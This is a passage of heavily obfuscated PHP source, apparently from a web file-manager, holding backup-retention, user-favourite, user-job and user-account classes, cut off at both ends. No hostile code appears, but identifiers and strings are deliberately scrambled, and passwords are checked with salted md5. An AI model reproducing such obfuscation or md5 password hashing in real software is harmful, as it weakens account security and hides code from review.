$İ«²áïË[$º¿‰åªè[32]] == self::$name) { $this->model->remove($İ«²áïË[$º¿‰åªè[477]]); } $İ«²áïË = $this->initData($ôØè©ş, $İ«²áïË[$º¿‰åªè[832]]); } else { $this->checkStore($İ«²áïË[$º¿‰åªè[832]]); } } self::$option = $İ«²áïË; } private function isManual() { $íœ®µ£ƒ = _get($GLOBALS, $_SERVER[¡¬ıÜ ƒ][833], 0); $íœ®µ£ƒ = intval($íœ®µ£ƒ); self::$manual = $íœ®µ£ƒ && $íœ®µ£ƒ == 1 ? 1 : 0; } private function initData($Ô‚û”ª£ = 0, $ù½¸¿ÔŒ = '') { $¶¼æâ·ø =& $_SERVER[¡¬ıÜ ƒ]; $ÇøõËƒĞ = $this->model->config(); if ($ù½¸¿ÔŒ && $ÇøõËƒĞ[$¶¼æâ·ø[832]] != $ù½¸¿ÔŒ) { $Ô‚û”ª£ = 0; } $this->checkStore($ÇøõËƒĞ[$¶¼æâ·ø[832]]); if (self::$manual == 1) { self::$name .= $¶¼æâ·ø[11] . date($¶¼æâ·ø[834]); } $ÀÙ†„ÂÜ = array($¶¼æâ·ø[832] => $ÇøõËƒĞ[$¶¼æâ·ø[832]], $¶¼æâ·ø[32] => self::$name, $¶¼æâ·ø[830] => 0, $¶¼æâ·ø[171] => $ÇøõËƒĞ[$¶¼æâ·ø[171]], $¶¼æâ·ø[835] => self::$manual, $¶¼æâ·ø[370] => array($¶¼æâ·ø[836] => array($¶¼æâ·ø[830] => 0), $¶¼æâ·ø[837] => array($¶¼æâ·ø[830] => 0, $¶¼æâ·ø[838] => 0, $¶¼æâ·ø[839] => 0, $¶¼æâ·ø[33] => $¶¼æâ·ø[12], $¶¼æâ·ø[840] => 0, $¶¼æâ·ø[841] => 0), $¶¼æâ·ø[842] => array($¶¼æâ·ø[830] => 0, $¶¼æâ·ø[838] => 0, $¶¼æâ·ø[839] => 0, $¶¼æâ·ø[840] => 0, $¶¼æâ·ø[841] => 0), $¶¼æâ·ø[232] => array($¶¼æâ·ø[830] => 0, $¶¼æâ·ø[843] => 0, $¶¼æâ·ø[844] => 0, $¶¼æâ·ø[845] => 0, $¶¼æâ·ø[846] => 0, $¶¼æâ·ø[543] => $Ô‚û”ª£, $¶¼æâ·ø[840] => 0, $¶¼æâ·ø[841] => 0)), $¶¼æâ·ø[840] => time(), $¶¼æâ·ø[841] => 0); $¸í®½û = $this->model->insert($ÀÙ†„ÂÜ); $ÀÙ†„ÂÜ[$¶¼æâ·ø[477]] = $¸í®½û; return $ÀÙ†„ÂÜ; } private function checkStore($†¬ñÓúé) { $ûè¥ü×À = Model($_SERVER[¡¬ıÜ ƒ][847]); $á¨×Û§ = $ûè¥ü×À->listData($†¬ñÓúé); $ûè¥ü×À->checkConfig($á¨×Û§); } public static function get() { if (!self::$option) { $Ê ¹…Î = Model($_SERVER[¡¬ıÜ ƒ][828]); $¤¸Ê¾¼ = $Ê ¹…Î->findByName(self::$name); $Ê ¹…Î->parseContent($¤¸Ê¾¼); self::$option = $¤¸Ê¾¼; } return self::$option; } public static function set($Ş™¾ÎÏ‘) { $Ä¸çÊ¡“ =& $_SERVER[¡¬ıÜ ƒ]; $Á¡Ú”Û§ = self::get(); foreach ($Ş™¾ÎÏ‘ as $ñëØÜ‰ => $×ÍÛÑÁ‚) { array_set_value($Á¡Ú”Û§, $ñëØÜ‰, $×ÍÛÑÁ‚); } Model($Ä¸çÊ¡“[828])->update($Á¡Ú”Û§[$Ä¸çÊ¡“[477]], $Á¡Ú”Û§); self::$option = $Á¡Ú”Û§; return self::$option; } public function keep() { $›ö­å¹« =& $_SERVER[¡¬ıÜ ƒ]; $ÊãÜôé‰ = self::get(); if (_get($ÊãÜôé‰, $›ö­å¹«[848], 0) == $›ö­å¹«[91]) { return; } $this->backupKeep($ÊãÜôé‰); self::set(array($›ö­å¹«[848] => 1)); } private function backupKeep($óŠŒÙÓ) { $‚¥À—• =& $_SERVER[¡¬ıÜ ƒ]; if (self::$manual == 1) { return; } $öòâõ¥Ê = $this->model->listData(); if (empty($öòâõ¥Ê)) { return; } $À‰¥şëú = 0; $•ú¤âàœ = array(); foreach ($öòâõ¥Ê as $ñçÕ¬–¦) { if ($À‰¥şëú >= 7) { break; } $•ú¤âàœ[] = $ñçÕ¬–¦[$‚¥À—•[32]]; $À‰¥şëú++; } for ($À‰¥şëú = 0; $À‰¥şëú < 12; $À‰¥şëú++) { $•ú¤âàœ[] = date($‚¥À—•[849], strtotime("\55{$À‰¥şëú}\x20\155\x6f\156\x74\150\163")); } $•ú¤âàœ = array_unique($•ú¤âàœ); $§Î¹Ğ‹Á = Model($‚¥À—•[850])->get($‚¥À—•[851]); foreach ($öòâõ¥Ê as $ñçÕ¬–¦) { if (isset($ñçÕ¬–¦[$‚¥À—•[835]]) && $ñçÕ¬–¦[$‚¥À—•[835]] == $‚¥À—•[91]) { continue; } if (!empty($ñçÕ¬–¦[$‚¥À—•[32]]) && in_array($ñçÕ¬–¦[$‚¥À—•[32]], $•ú¤âàœ)) { continue; } $this->model->remove($ñçÕ¬–¦[$‚¥À—•[477]]); $ôÛ¬ÀÎ = $this->backupPath($óŠŒÙÓ, $§Î¹Ğ‹Á); IO::remove($ôÛ¬ÀÎ, !1); } } private function backupPath($ñı¨ÔÙı, $°—®©ï— = false) { $Èš¯›ï– =& $_SERVER[¡¬ıÜ ƒ]; if (!$°—®©ï—) { $°—®©ï— = Model($Èš¯›ï–[850])->get($Èš¯›ï–[851]); } $†“Ö¼ ˜ = $ñı¨ÔÙı[$Èš¯›ï–[32]]; $üïş· á = substr(md5($Èš¯›ï–[852] . $°—®©ï— . $†“Ö¼ ˜), 0, 8); return "\173\x69\157\x3a{$ñı¨ÔÙı[$Èš¯›ï–[832]]}\175\57\144\141\x74\x61\x62\141\x73\x65\x2f\x62\x61\x63\153\165\160\57" . $†“Ö¼ ˜ . $Èš¯›ï–[11] . $üïş· á; } public function db() { $°ì­¾ÌŸ =& $_SERVER[¡¬ıÜ ƒ]; $¥ïıãÛ = self::get(); if (_get($¥ïıãÛ, $°ì­¾ÌŸ[853], 0) == $°ì­¾ÌŸ[91]) { return !0; } $œİ¨¥Å = new BackupDb(); if (!$œİ¨¥Å->index()) { return !1; } self::set(array($°ì­¾ÌŸ[853] => 1)); return !0; } public function dbFile() { $‘¬­’ÊÛ =& $_SERVER[¡¬ıÜ ƒ]; $÷ìÀ‚Å– = self::get(); if (_get($÷ìÀ‚Å–, $‘¬­’ÊÛ[854], 0) == $‘¬­’ÊÛ[91]) { return !0; } $÷¸Â±¯ = new BackupDbFile(); if (!$÷¸Â±¯->index()) { return !1; } self::set(array($‘¬­’ÊÛ[854] => 1)); return !0; } public function file() { $‰ì±É =& $_SERVER[¡¬ıÜ ƒ]; $°ÅÌ‹ïÈ = self::get(); if (_get($°ÅÌ‹ïÈ, $‰ì±É[855], 0) == $‰ì±É[91]) { return !0; } if ($°ÅÌ‹ïÈ[$‰ì±É[171]] == $‰ì±É[856]) { $‡âÉÕÅØ = new BackupFile(); if (!$‡âÉÕÅØ->index()) { return !1; } } self::set(array($‰ì±É[855] => 1, $‰ì±É[830] => 1)); return !0; } } goto e£’¦§…ùÈ; A·Ó¾¼Å÷’: class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\162\137\146\x61\166"; protected function cacheFunctionAlias($¸ßíÏÅô) { $ëÒÚüİ =& $_SERVER[¡¬ıÜ ƒ]; return array($ëÒÚüİ[2101] => array(USER_ID, $ëÒÚüİ[2471])); } protected function listData() { $æÊÃ‰¢š =& $_SERVER[¡¬ıÜ ƒ]; $ÄÆÀéÏƒ = array($æÊÃ‰¢š[1776] => USER_ID, $æÊÃ‰¢š[559] => 0); $› À€Ã‹ = $æÊÃ‰¢š[2472]; $ò–Âò‡ª = $this->field($› À€Ã‹)->where($ÄÆÀéÏƒ)->order($æÊÃ‰¢š[2473])->select(); return $ò–Âò‡ª ? $ò–Âò‡ª : array(); } protected function resetCache() { } protected function listView() { $á¬×¨ó‘ =& $_SERVER[¡¬ıÜ ƒ]; $êãŞõ÷ = $this->listData(); $Øà³°ë£ = array_filter_by_field($êãŞõ÷, $á¬×¨ó‘[33], $á¬×¨ó‘[492]); $Å¨€Ï†ı = array_to_keyvalue($Øà³°ë£, $á¬×¨ó‘[12], $á¬×¨ó‘[87]); if (!$Å¨€Ï†ı) { return $êãŞõ÷; } $åèñÜ”· = 2000; $úÜ€®Üş = array($á¬×¨ó‘[493] => array($á¬×¨ó‘[494], $Å¨€Ï†ı)); $¦Îİ¦Ï = Model($á¬×¨ó‘[914])->listSource($úÜ€®Üş, $åèñÜ”·); $¦Îİ¦Ï = array_merge($¦Îİ¦Ï[$á¬×¨ó‘[86]], $¦Îİ¦Ï[$á¬×¨ó‘[85]]); $¦Îİ¦Ï = array_to_keyvalue($¦Îİ¦Ï, $á¬×¨ó‘[193]); foreach ($êãŞõ÷ as $áÆÒÖ„Ë => $¶ÇÏ’ ) { $´è‚ïğ² = $¦Îİ¦Ï[$¶ÇÏ’ [$á¬×¨ó‘[87]]]; $´è‚ïğ² = $´è‚ïğ² ? $´è‚ïğ² : array(); $êãŞõ÷[$áÆÒÖ„Ë] = array_merge($´è‚ïğ², $¶ÇÏ’ ); } return $êãŞõ÷; } protected function addFav($€°¯¦›‘, $ÊõÄõÆø = '', $ºå³øşÚ = "\163\157\x75\162\143\x65") { $Úà×ää´ =& $_SERVER[¡¬ıÜ ƒ]; $È¸×‚Ë· = array($Úà×ää´[1776] => USER_ID, $Úà×ää´[559] => 0, $Úà×ää´[498] => $ºå³øşÚ, $Úà×ää´[497] => $€°¯¦›‘); if ($this->where($È¸×‚Ë·)->find()) { return !1; } $È¸×‚Ë· = array($Úà×ää´[1776] => USER_ID, $Úà×ää´[559] => 0); $Ø¶ùø‘— = $this->where($È¸×‚Ë·)->max($Úà×ää´[2010]); if (!$Ø¶ùø‘—) { $Ø¶ùø‘— = 0; } if (!$ÊõÄõÆø && $ºå³øşÚ == $Úà×ää´[492]) { $ÃªûØØ  = Model($Úà×ää´[1432])->where(array($Úà×ää´[493] => $€°¯¦›‘))->find(); if (!$ÃªûØØ ) { return !1; } $ÊõÄõÆø = $ÃªûØØ [$Úà×ää´[32]]; } $ÊõÄõÆø = $this->getAutoName($ÊõÄõÆø); $—ïÙÂĞ… = array($Úà×ää´[1776] => USER_ID, $Úà×ää´[559] => 0, $Úà×ää´[496] => $ÊõÄõÆø, $Úà×ää´[497] => $€°¯¦›‘, $Úà×ää´[498] => $ºå³øşÚ, $Úà×ää´[1990] => $Ø¶ùø‘— + 1); return $this->add($—ïÙÂĞ…); } protected function remove($îşöŒõ“) { $ÆŠÑ¥ƒ˜ =& $_SERVER[¡¬ıÜ ƒ]; $Ã¿¥¯ıø = array($ÆŠÑ¥ƒ˜[1776] => USER_ID, $ÆŠÑ¥ƒ˜[495] => $îşöŒõ“); return $this->where($Ã¿¥¯ıø)->delete(); } protected function removeByName($»á¯¢Ûı) { $ªÂŸşÛç =& $_SERVER[¡¬ıÜ ƒ]; $ öº©Ğ¬ = array($ªÂŸşÛç[1776] => USER_ID, $ªÂŸşÛç[496] => $»á¯¢Ûı, $ªÂŸşÛç[559] => 0); return $this->where($ öº©Ğ¬)->delete(); } protected function rename($¨ë¤è×Ú, $ôëœäö¹) { $Ä§®æ‰ù =& $_SERVER[¡¬ıÜ ƒ]; if ($¨ë¤è×Ú == $ôëœäö¹) { return !1; } $ß‡£×ó¾ = $this->getAutoName($ôëœäö¹); if ($ôëœäö¹ != $ß‡£×ó¾) { return !1; } $‘ğÇ¨¿¡ = array($Ä§®æ‰ù[1776] => USER_ID, $Ä§®æ‰ù[559] => 0, $Ä§®æ‰ù[32] => $¨ë¤è×Ú); return $this->where($‘ğÇ¨¿¡)->save(array($Ä§®æ‰ù[32] => $ôëœäö¹)); } protected function resetSort($¼ãö“¥…) { $ıŞœÌÍ‹ =& $_SERVER[¡¬ıÜ ƒ]; $¼ãö“¥… = is_array($¼ãö“¥…) ? $¼ãö“¥… : array(); $àå†Ó›ã = array($ıŞœÌÍ‹[1776] => USER_ID); for ($‹¡Ü†ç¹ = 0; $‹¡Ü†ç¹ < count($¼ãö“¥…); $‹¡Ü†ç¹++) { $àå†Ó›ã[$ıŞœÌÍ‹[495]] = $¼ãö“¥…[$‹¡Ü†ç¹]; $this->where($àå†Ó›ã)->save(array($ıŞœÌÍ‹[1990] => $‹¡Ü†ç¹ + 1)); } return !0; } protected function moveTop($‘îè™ÖÒ) { $ÇÉÔ¿—Ã =& $_SERVER[¡¬ıÜ ƒ]; $Èï×¿—ô = array($ÇÉÔ¿—Ã[1776] => USER_ID, $ÇÉÔ¿—Ã[559] => 0); $ÀŒŸÇÉÃ = $this->where($Èï×¿—ô)->where(array($ÇÉÔ¿—Ã[32] => $‘îè™ÖÒ))->find(); if (!$ÀŒŸÇÉÃ) { return; } $‰ø„à“­ = $this->field($ÇÉÔ¿—Ã[477])->where($Èï×¿—ô)->order($ÇÉÔ¿—Ã[2473])->select(); $‰ø„à“­ = array_to_keyvalue($‰ø„à“­, $ÇÉÔ¿—Ã[12], $ÇÉÔ¿—Ã[477]); $ïñ‡‘è• = $‰ø„à“­; $‰ø„à“­ = array_remove_value($‰ø„à“­, $ÀŒŸÇÉÃ[$ÇÉÔ¿—Ã[477]]); array_unshift($‰ø„à“­, $ÀŒŸÇÉÃ[$ÇÉÔ¿—Ã[477]]); return $this->resetSort($‰ø„à“­); } protected function moveBottom($ °ğ„ßŞ) { $Ûú®î =& $_SERVER[¡¬ıÜ ƒ]; $ÑÄøÇ÷­ = array($Ûú®î[1776] => USER_ID, $Ûú®î[559] => 0); $Úë§ô±™ = $this->where($ÑÄøÇ÷­)->max($Ûú®î[2010]); $ôğƒ¸ = array($Ûú®î[2010] => $Úë§ô±™ + 1); return $this->where($ÑÄøÇ÷­)->where(array($Ûú®î[32] => $ °ğ„ßŞ))->save($ôğƒ¸); } private function getAutoName($¼»±ñ˜¥) { $™ç¯’â¢ =& $_SERVER[¡¬ıÜ ƒ]; $‘ĞÂèˆš = array($™ç¯’â¢[1776] => USER_ID, $™ç¯’â¢[559] => 0); $¼²Œã‰ï = $this->field($™ç¯’â¢[32])->where($‘ĞÂèˆš)->select(); $¼²Œã‰ï = array_to_keyvalue($¼²Œã‰ï, $™ç¯’â¢[12], $™ç¯’â¢[32]); if (!$¼²Œã‰ï || !in_array($¼»±ñ˜¥, $¼²Œã‰ï)) { return $¼»±ñ˜¥; } for ($ˆšÖ‡® = 0; $ˆšÖ‡® < count($¼²Œã‰ï); $ˆšÖ‡®++) { if (!in_array($¼»±ñ˜¥ . "\x28{$ˆšÖ‡®}\51", $¼²Œã‰ï)) { return $¼»±ñ˜¥ . "\x28{$ˆšÖ‡®}\x29"; } } return $¼»±ñ˜¥ . "\50{$ˆšÖ‡®}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\152\157\142\114\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\144\x65\163\143", "\163\x6f\162\x74"); const JOB_KEY = "\x73\x65\x6c\x66\112\157\142\114\151\163\x74"; public function listData($òüõ— = false, $Ä¯·ÊÒ = "\x73\x6f\162\x74", $©ì£ú¦é = false) { return parent::listData($òüõ—, $Ä¯·ÊÒ, $©ì£ú¦é); } public function remove($ËÀÎ”´É) { return parent::remove($ËÀÎ”´É); } public function add($…æœ°Ü) { $¿ìô· =& $_SERVER[¡¬ıÜ ƒ]; if ($this->findByName($…æœ°Ü[$¿ìô·[32]])) { return !1; } $…æœ°Ü[$¿ìô·[2010]] = $this->getSort(); return parent::insert($…æœ°Ü); } private function getSort() { $Ğ§Ìª‡Ù =& $_SERVER[¡¬ıÜ ƒ]; $±Ì²¦Á = parent::listData(); $¡‚óîÖ„ = array_to_keyvalue($±Ì²¦Á, $Ğ§Ìª‡Ù[12], $Ğ§Ìª‡Ù[2010]); return empty($¡‚óîÖ„) ? 0 : max($¡‚óîÖ„) + 1; } public function update($½ÜğÏ‡å, $è‘¤Šä—) { $Ã¨íÅâ› =& $_SERVER[¡¬ıÜ ƒ]; $Ÿ“ôÍİú = parent::listData($½ÜğÏ‡å); $ß™Äşµ¦ = $this->findByName($è‘¤Šä—[$Ã¨íÅâ›[32]]); if (!$Ÿ“ôÍİú || $ß™Äşµ¦ && $ß™Äşµ¦[$Ã¨íÅâ›[477]] != $Ÿ“ôÍİú[$Ã¨íÅâ›[477]]) { return !1; } return parent::update($½ÜğÏ‡å, $è‘¤Šä—); } public function setUserJob($¥¢™ÈÃí, $»´Ù‚‘î) { $ìÌÉŒ§» =& $_SERVER[¡¬ıÜ ƒ]; if (!is_array($»´Ù‚‘î)) { $»´Ù‚‘î = array($»´Ù‚‘î); } $¿Øì¼çä = parent::listData(); $³»êŒş³ = array_to_keyvalue($¿Øì¼çä, $ìÌÉŒ§»[32]); $ÃÈÃ úÓ = $ìÌÉŒ§»[456]; foreach ($»´Ù‚‘î as $Ù’§°¹ß) { if ($³»êŒş³[$Ù’§°¹ß]) { $ÃÈÃ úÓ .= $³»êŒş³[$Ù’§°¹ß][$ìÌÉŒ§»[477]] . $ìÌÉŒ§»[50]; } else { $±Ğïã‚¸ = $this->add($Ù’§°¹ß); $ÃÈÃ úÓ .= $±Ğïã‚¸ . $ìÌÉŒ§»[50]; } } $ÃÈÃ úÓ = rtrim($ÃÈÃ úÓ, $ìÌÉŒ§»[50]); Model($ìÌÉŒ§»[599])->metaSet($¥¢™ÈÃí, self::JOB_KEY, $ÃÈÃ úÓ); } public function getUserJob($öªşÙÙ) { $ï¥¶‹Ëæ = Model($_SERVER[¡¬ıÜ ƒ][599])->metaGet($öªşÙÙ); return $this->getUserJobInfo($ï¥¶‹Ëæ[self::JOB_KEY]); } public function getUserJobInfo($úğ¸ÖáŸ) { $ü¨³Í‡ğ =& $_SERVER[¡¬ıÜ ƒ]; $Ùâ­‡ùµ = explode($ü¨³Í‡ğ[50], $úğ¸ÖáŸ); $¸ÊÎ‹×œ = parent::listData(); $¸ÊÎ‹×œ = array_remove_key($¸ÊÎ‹×œ, $ü¨³Í‡ğ[233]); $¯Ó‡©ƒ¢ = array(); foreach ($Ùâ­‡ùµ as $â¼ÃüàÄ) { if (isset($¸ÊÎ‹×œ[$â¼ÃüàÄ])) { $¯Ó‡©ƒ¢[] = $¸ÊÎ‹×œ[$â¼ÃüàÄ]; } } return $¯Ó‡©ƒ¢; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\x61\155\145" => "\x75\163\x65\x72\x5f\155\145\x74\141", "\x6d\x65\164\x61\x46\151\x65\154\x64" => "\x75\x73\x65\162\x49\104"); protected $simpleField = "\165\163\145\x72\111\x44\x2c\x6e\x69\x63\153\116\x61\155\x65\x2c\156\141\155\145\x2c\141\166\x61\x74\x61\x72\54\x73\x65\x78\x2c\163\x74\x61\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¤øŒ°ï×) { $ßçíüš‚ =& $_SERVER[¡¬ıÜ ƒ]; $ŸŞª´ì½ = $ßçíüš‚[2474]; return array($ßçíüš‚[2068] => array($¤øŒ°ï×[0], $ŸŞª´ì½), $ßçíüš‚[2070] => array($¤øŒ°ï×[0], $ŸŞª´ì½), $ßçíüš‚[2475] => array($¤øŒ°ï×[0], $ŸŞª´ì½)); } protected function getInfo($µÎè¡üç, $„º¹³ š = false) { $öšŠ¯·… = $this->getInfoSimple($µÎè¡üç); if (!is_array($öšŠ¯·…)) { return array(); } if ($„º¹³ š) { return $this->_getInfoApply($öšŠ¯·…); } return $this->cacheFunctionGet($_SERVER[¡¬ıÜ ƒ][2072], $µÎè¡üç); } protected function getInfoFull($–÷¨İÖÓ, $Š¨ÎåÃ = false) { $¹§úÎ‹§ = $this->getInfoSimple($–÷¨İÖÓ); if (!is_array($¹§úÎ‹§)) { return array(); } if ($Š¨ÎåÃ) { return $this->_getInfoApply($¹§úÎ‹§, !0); } return $this->cacheFunctionGet($_SERVER[¡¬ıÜ ƒ][2476], $–÷¨İÖÓ); } private function _getInfoApply($¶Ñ™³Ï³, $¡ëô­ê = false) { $‰ÏóşĞ¿ =& $_SERVER[¡¬ıÜ ƒ]; if (!$¶Ñ™³Ï³) { return $¶Ñ™³Ï³; } $‚ğ¯§Ô = md5($‰ÏóşĞ¿[2477] . $¶Ñ™³Ï³[$‰ÏóşĞ¿[977]] . $‰ÏóşĞ¿[2478] . $¶Ñ™³Ï³[$‰ÏóşĞ¿[32]]); $¶Ñ™³Ï³ = $this->_listDataApplyItem($¶Ñ™³Ï³); $ëûçà½ = Model($‰ÏóşĞ¿[1432])->metaGet($¶Ñ™³Ï³[$‰ÏóşĞ¿[90]][$‰ÏóşĞ¿[193]]); $¶Ñ™³Ï³[$‰ÏóşĞ¿[2479]] = $‚ğ¯§Ô; $¶Ñ™³Ï³[$‰ÏóşĞ¿[90]][$‰ÏóşĞ¿[2268]] = isset($ëûçà½[$‰ÏóşĞ¿[2269]]) ? $ëûçà½[$‰ÏóşĞ¿[2269]] : null; if ($¡ëô­ê) { $¶Ñ™³Ï³[$‰ÏóşĞ¿[541]] = $this->metaGet($¶Ñ™³Ï³[$‰ÏóşĞ¿[1785]]); } return $¶Ñ™³Ï³; } protected function getInfoSimple($ûÑºöú‹, $Ãğ‡àç‰ = false) { $ĞÆº˜Ãå =& $_SERVER[¡¬ıÜ ƒ]; if (!$ûÑºöú‹) { return array(); } if ($Ãğ‡àç‰) { $Ì„üœüŠ = $this->where(array($ĞÆº˜Ãå[1785] => intval($ûÑºöú‹)))->find(); if (!is_array($Ì„üœüŠ)) { return array(); } $Ì„üœüŠ[$ĞÆº˜Ãå[2480]] = Action($ĞÆº˜Ãå[2481])->parseUrl($Ì„üœüŠ[$ĞÆº˜Ãå[2480]]); return $Ì„üœüŠ; } return $this->cacheFunctionGet($ĞÆº˜Ãå[2073], $ûÑºöú‹); } protected function getInfoSimpleOuter($Ç€±ƒ) { $á†°·‹Ÿ =& $_SERVER[¡¬ıÜ ƒ]; if (!$Ç€±ƒ || $Ç€±ƒ == 0) { return array($á†°·‹Ÿ[1785] => $á†°·‹Ÿ[230], $á†°·‹Ÿ[32] => $á†°·‹Ÿ[176] . LNG($á†°·‹Ÿ[2482]) . $á†°·‹Ÿ[178], $á†°·‹Ÿ[2480] => STATIC_PATH . $á†°·‹Ÿ[2483]); } $öõ¸¾ñô = $this->cacheFunctionGet($á†°·‹Ÿ[2073], $Ç€±ƒ); $–ş»æÓ» = array_field_key($öõ¸¾ñô, explode($á†°·‹Ÿ[50], $this->simpleField)); if (!$–ş»æÓ») { return array($á†°·‹Ÿ[1785] => $á†°·‹Ÿ[1284], $á†°·‹Ÿ[32] => $á†°·‹Ÿ[176] . LNG($á†°·‹Ÿ[2484]) . $á†°·‹Ÿ[178], $á†°·‹Ÿ[2480] => STATIC_PATH . $á†°·‹Ÿ[2485]); } $–ş»æÓ»[$á†°·‹Ÿ[2480]] = Action($á†°·‹Ÿ[2481])->parseUrl($–ş»æÓ»[$á†°·‹Ÿ[2480]]); return $–ş»æÓ»; } protected function groupUser($½ÙÄ÷¾¦) { } public static function errorLang($›İõØ˜) { $™¦Õ¢À¨ =& $_SERVER[¡¬ıÜ ƒ]; $©ôÕ“Ô = array(self::ERROR_USER_NOT_EXISTS => $™¦Õ¢À¨[2486], self::ERROR_USER_PASSWORD_ERROR => $™¦Õ¢À¨[2487], self::ERROR_USER_EXIST_NAME => $™¦Õ¢À¨[2488], self::ERROR_USER_EXIST_PHONE => $™¦Õ¢À¨[2489], self::ERROR_USER_EXIST_EMAIL => $™¦Õ¢À¨[2490], self::ERROR_USER_LOGIN_LOCK => $™¦Õ¢À¨[2491], self::ERROR_IP_NOT_ALLOW => $™¦Õ¢À¨[2492], self::ERROR_USER_EXIST_NICKNAME => $™¦Õ¢À¨[2493]); $¸ƒõ•Ò½ = LNG($©ôÕ“Ô[$›İõØ˜]); if ($›İõØ˜ == self::ERROR_USER_LOGIN_LOCK) { $Æë°÷Û = (int) Model($™¦Õ¢À¨[2494])->get($™¦Õ¢À¨[2495]); if ($Æë°÷Û > 60) { $¸ƒõ•Ò½ = str_replace($™¦Õ¢À¨[91], ceil($Æë°÷Û / 60), $¸ƒõ•Ò½); } } return $¸ƒõ•Ò½; } protected function metaSet($¬öİĞßõ, $×ôÂÅœ = null, $ÒğŒºåÉ = null) { $this->clearCache($¬öİĞßõ); return parent::metaSet($¬öİĞßõ, $×ôÂÅœ, $ÒğŒºåÉ); } public function getInfoByMeta($¹ïûé’, $—‰Î·Îç) { $•ê¿í¢¶ =& $_SERVER[¡¬ıÜ ƒ]; $á¼ü‡¤¸ = Model($•ê¿í¢¶[2496])->where(array($•ê¿í¢¶[97] => $¹ïûé’, $•ê¿í¢¶[452] => $—‰Î·Îç))->find(); if ($á¼ü‡¤¸) { return $this->getInfo($á¼ü‡¤¸[$•ê¿í¢¶[1785]]); } return !1; } public function userLoginCheck($öâÍá€¿, $œïÃü©Í) { $­ Œ˜Òã =& $_SERVER[¡¬ıÜ ƒ]; $¹Ò±È‘ = $this->userLoginFind($öâÍá€¿); if (!$¹Ò±È‘) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¹Ò±È‘[$­ Œ˜Òã[1785]], $œïÃü©Í)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($¹Ò±È‘[$­ Œ˜Òã[1785]]); } public function userLoginFind($â¿˜ò±¨) { $æ¥‡ş¹ =& $_SERVER[¡¬ıÜ ƒ]; $Š„¯å˜ = array($æ¥‡ş¹[32] => $â¿˜ò±¨, $æ¥‡ş¹[2281] => $â¿˜ò±¨, $æ¥‡ş¹[382] => $â¿˜ò±¨, $æ¥‡ş¹[2497] => $â¿˜ò±¨, $æ¥‡ş¹[1088] => $æ¥‡ş¹[1090]); if ($this->nickNameRpt()) { unset($Š„¯å˜[$æ¥‡ş¹[2281]]); } return $this->where($Š„¯å˜)->find(); } public function clearCache($·¡óùÈ´) { $Ì¯…´„ =& $_SERVER[¡¬ıÜ ƒ]; $this->cacheFunctionClear($Ì¯…´„[2072], $·¡óùÈ´); $this->cacheFunctionClear($Ì¯…´„[2073], $·¡óùÈ´); $this->cacheFunctionClear($Ì¯…´„[2476], $·¡óùÈ´); } public function userPasswordCheck($İ©ıëí©, $×’ÔàŒû) { $á‰ûŠ— =& $_SERVER[¡¬ıÜ ƒ]; $œºŠÉ¥ = $this->where(array($á‰ûŠ—[1785] => intval($İ©ıëí©)))->find(); $ñœşËº = $this->metaGet($İ©ıëí©); $õá³¢œˆ = isset($ñœşËº[$á‰ûŠ—[2498]]) ? $ñœşËº[$á‰ûŠ—[2498]] : $á‰ûŠ—[12]; if (md5($õá³¢œˆ . trim($×’ÔàŒû)) !== $œºŠÉ¥[$á‰ûŠ—[977]]) { return !1; } return !0; } public function userAdd($·¼êÚÁÉ) { $ÌšŒÑúÛ =& $_SERVER[¡¬ıÜ ƒ]; $İş–ğ = array($ÌšŒÑúÛ[496] => $·¼êÚÁÉ[$ÌšŒÑúÛ[32]], $ÌšŒÑúÛ[2499] => $·¼êÚÁÉ[$ÌšŒÑúÛ[2193]], $ÌšŒÑúÛ[2500] => isset($·¼êÚÁÉ[$ÌšŒÑúÛ[382]]) ? $·¼êÚÁÉ[$ÌšŒÑúÛ[382]] : $ÌšŒÑúÛ[12], $ÌšŒÑúÛ[2501] => isset($·¼êÚÁÉ[$ÌšŒÑúÛ[2497]]) ? $·¼êÚÁÉ[$ÌšŒÑúÛ[2497]] : $ÌšŒÑúÛ[12], $ÌšŒÑúÛ[2502] => isset($·¼êÚÁÉ[$ÌšŒÑúÛ[2281]]) ? $·¼êÚÁÉ[$ÌšŒÑúÛ[2281]] : $·¼êÚÁÉ[$ÌšŒÑúÛ[32]], $ÌšŒÑúÛ[2503] => isset($·¼êÚÁÉ[$ÌšŒÑúÛ[2480]]) ? $·¼êÚÁÉ[$ÌšŒÑúÛ[2480]] : $ÌšŒÑúÛ[12], $ÌšŒÑúÛ[2504] => isset($·¼êÚÁÉ[$ÌšŒÑúÛ[2505]]) ? $·¼êÚÁÉ[$ÌšŒÑúÛ[2505]] : 1, $ÌšŒÑúÛ[2506] => $·¼êÚÁÉ[$ÌšŒÑúÛ[977]], $ÌšŒÑúÛ[2074] => isset($·¼êÚÁÉ[$ÌšŒÑúÛ[1972]]) ? $·¼êÚÁÉ[$ÌšŒÑúÛ[1972]] : 1024 * 1024 * 20, $ÌšŒÑúÛ[2075] => 0, $ÌšŒÑúÛ[2507] => 0, $ÌšŒÑúÛ[2119] => isset($·¼êÚÁÉ[$ÌšŒÑúÛ[830]]) ? $·¼êÚÁÉ[$ÌšŒÑúÛ[830]] : 1); if (!empty($·¼êÚÁÉ[$ÌšŒÑúÛ[1785]])) { $İş–ğ[$ÌšŒÑúÛ[1785]] = $·¼êÚÁÉ[$ÌšŒÑúÛ[1785]]; } $•ŒÔ¢¹û = $this->_checkExist($·¼êÚÁÉ); if ($•ŒÔ¢¹û !== !0) { return $•ŒÔ¢¹û; } if (!empty($İş–ğ[$ÌšŒÑúÛ[2480]]) && strlen($İş–ğ[$ÌšŒÑúÛ[2480]]) > 255) { $İş–ğ[$ÌšŒÑúÛ[2480]] = 